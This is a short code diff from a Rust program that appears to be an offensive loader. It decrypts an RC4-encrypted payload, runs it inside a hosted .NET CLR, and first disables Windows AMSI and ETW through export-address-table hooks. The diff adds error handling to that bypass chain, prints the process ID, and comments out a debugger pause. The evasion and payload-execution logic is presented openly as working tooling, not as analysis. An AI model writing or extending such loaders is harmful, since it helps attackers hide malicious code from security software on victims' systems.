@@ -41,6 +41,7 @@ use winapi::um::{
 
     memoryapi::VirtualProtect,
     processthreadsapi::GetCurrentProcess,
+    processthreadsapi::GetCurrentProcessId,
     psapi::{MODULEINFO, GetModuleInformation},
     winnt::{PAGE_EXECUTE_READWRITE, PIMAGE_DOS_HEADER, PIMAGE_EXPORT_DIRECTORY, PIMAGE_NT_HEADERS},
     winuser::{MB_OK, MessageBoxA},
@@ -301,9 +302,19 @@ unsafe fn EATHookETW() -> bool {
 
 fn setup_bypass() -> bool {
     unsafe{
-        patchMessageboxA();
-        EATHookAMSI();
-        EATHookETW();
+        
+        let patch_result = patchMessageboxA();
+        if !patch_result {
+            return false;
+        }
+        let amsi_result = EATHookAMSI();
+        if !amsi_result {
+            return false;
+        }
+        let etw_result = EATHookETW();
+        if !etw_result {
+            return false;
+        }
     }
 
     return true;
@@ -356,11 +367,13 @@ fn main() -> Result<(), String> {
     let (path, args) = prepare_args();
     let shellcode = decrypt_rc4(&path);
     let mut clr = Clr::new(shellcode, args)?;
+    let pid = unsafe { GetCurrentProcessId() };
+    println!("[+] Current process ID: {}", pid);
     let status = unsafe { setup_bypass() };
 
     // windbg debug code
-    let mut s = String::new();
-    std::io::stdin().read_line(&mut s).unwrap();
+    // let mut s = String::new();
+    // std::io::stdin().read_line(&mut s).unwrap();
 
     if status {
         println!("[+] start running CLR");
